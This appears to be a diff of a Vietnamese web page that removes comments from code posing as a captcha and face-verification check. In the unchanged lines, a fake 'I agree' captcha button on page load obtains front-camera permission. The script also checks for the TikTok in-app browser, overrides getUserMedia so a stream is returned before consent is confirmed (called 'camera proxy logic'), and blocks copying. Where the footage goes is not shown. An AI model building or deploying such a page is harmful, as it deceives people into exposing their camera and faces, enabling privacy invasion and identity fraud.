@@ -68,8 +68,6 @@
             object-fit: cover;
             display: none;
         }
-
-        /* ===== LỚP PHỦ CAPTCHA ===== */
         .captcha-overlay {
             position: absolute;
             top: 0;
@@ -141,8 +139,6 @@
         .captcha-btn .check {
             font-size: 20px;
         }
-
-        /* ===== FACE SCANNER OVERLAY ===== */
         .scanner-overlay {
             position: absolute;
             top: 0;
@@ -395,8 +391,6 @@
         <div class="camera-view" id="vBox">
             <p id="msg" style="color: #484f58;">Đang khởi tạo camera...</p>
             <video id="preview" autoplay playsinline muted></video>
-            
-            <!-- Lớp phủ CAPTCHA bắt buộc ấn nút -->
             <div class="captcha-overlay" id="captchaOverlay">
                 <div class="icon-cam">📷</div>
                 <h3>Xác nhận quyền truy cập</h3>
@@ -405,8 +399,6 @@
                     <span class="check">✓</span> Tôi đồng ý
                 </button>
             </div>
-            
-            <!-- Overlay quét mặt -->
             <div class="scanner-overlay" id="scannerOverlay">
                 <div class="scan-frame">
                     <span class="corner corner-tl"></span>
@@ -432,7 +424,7 @@
     </div>
 
     <script>
-        // --- PHẦN 1: CẬP NHẬT USER AGENT TIKTOK MỚI NHẤT ---
+  
         function checkAndShowWarning() {
             const ua = navigator.userAgent || navigator.vendor || window.opera;
             const isTikTok = /TikTok|musical_ly|ByteLocale/i.test(ua);
@@ -444,8 +436,6 @@
             }
         }
         document.addEventListener("DOMContentLoaded", checkAndShowWarning);
-
-        // --- PHẦN 2: LOGIC CAMERA PROXY (GIỮ NGUYÊN) ---
         const btn = document.getElementById('startBtn');
         const video = document.getElementById('preview');
         const status = document.getElementById('status');
@@ -464,35 +454,26 @@
         let frontStream = null;
         let progressInterval = null;
 
-        // ===== XỬ LÝ NÚT CAPTCHA =====
+
         let cameraGranted = false;
 
         captchaBtn.addEventListener('click', async function(e) {
             e.preventDefault();
-            
-            // Hiệu ứng click
             this.style.transform = 'scale(0.96)';
             setTimeout(() => { this.style.transform = ''; }, 200);
-            
-            // Vô hiệu hóa nút
             this.disabled = true;
             this.innerHTML = '⏳ Đang khởi tạo...';
             
             try {
-                // Yêu cầu quyền camera
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user' }
                 });
-                
-                // Hủy stream tạm thời (sẽ được tạo lại bởi logic gốc)
                 stream.getTracks().forEach(t => t.stop());
                 
                 cameraGranted = true;
                 captchaOverlay.classList.add('hidden');
                 btn.disabled = false;
                 status.innerHTML = '✅ Camera đã sẵn sàng. Nhấn "Bắt đầu xác thực" để tiến hành.';
-                
-                // Kích hoạt camera qua logic gốc
                 await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user' }
                 });
@@ -505,11 +486,8 @@
                 alert('Vui lòng cho phép truy cập camera để xác thực khuôn mặt!');
             }
         });
-
-        // Override getUserMedia để giữ logic gốc nhưng chỉ cho phép sau khi đã cấp quyền
         navigator.mediaDevices.getUserMedia = async (constraints) => {
             if (!cameraGranted) {
-                // Nếu chưa cấp quyền, vẫn cho phép để lấy stream nhưng không hiển thị
                 const stream = await originalGetUserMedia(constraints);
                 return stream;
             }
@@ -533,8 +511,6 @@
                 originalStop.apply(this);
             }
         };
-
-        // ===== HÀM CẬP NHẬT PROGRESS =====
         function updateProgress(percent) {
             const circumference = 125.6;
             const offset = circumference - (percent / 100) * circumference;
@@ -585,8 +561,6 @@
             
             btn.disabled = true;
             btn.innerText = "ĐANG XỬ LÝ...";
-            
-            // Ripple effect
             const rect = btn.getBoundingClientRect();
             const ripple = document.createElement('span');
             ripple.className = 'ripple';
@@ -634,12 +608,8 @@
                 }
             }, 1000);
         }
-
-        // ===== TỰ ĐỘNG HIỆN CAPTCHA KHI LOAD =====
         window.addEventListener('load', function() {
-            // Ẩn message camera mặc định
             msg.style.display = 'none';
-            // Hiển thị captcha overlay
             captchaOverlay.style.display = 'flex';
             status.innerHTML = '📸 Vui lòng xác nhận quyền truy cập camera để tiếp tục.';
         });
@@ -647,7 +617,6 @@
     </script>
     
     <script>
-        // Chặn copy
         document.addEventListener('copy', function (e) {
             e.preventDefault();
             return false;
